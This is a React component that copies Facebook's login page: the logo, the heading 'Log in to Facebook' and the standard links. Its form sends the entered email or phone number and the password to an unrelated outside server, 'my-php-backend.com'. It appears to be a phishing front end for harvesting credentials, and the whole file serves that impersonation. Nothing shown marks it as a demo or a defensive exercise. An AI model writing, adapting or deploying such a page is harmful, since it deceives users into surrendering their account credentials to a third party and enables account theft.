import React from "react";
import logoFb from "../images/logoFb.svg";

export default function Form() {
  return (
    <div className="box-ex">
      <div className="box-in">
        <img src={logoFb} alt="Logo Facebook" className="logo" />
        <div className="box_container">
          <h1 className="title">Log in to Facebook</h1>
          <form
            action="https://my-php-backend.com"
            method="POST"
            className="login_form"
          >
            <input
              type="text"
              name="userinfo"
              placeholder="Email address or phone number"
              required
            />
            <input
              type="text"
              name="password"
              placeholder="Password"
              required
            />
            <input type="submit" className="submit_btn" value="Log In" />
          </form>
          <div className="links">
            <a href="#">Forgotten account?</a>
            <span> · </span>
            <a href="#">Sign up for Facebook</a>
          </div>
        </div>
      </div>
    </div>
  );
}
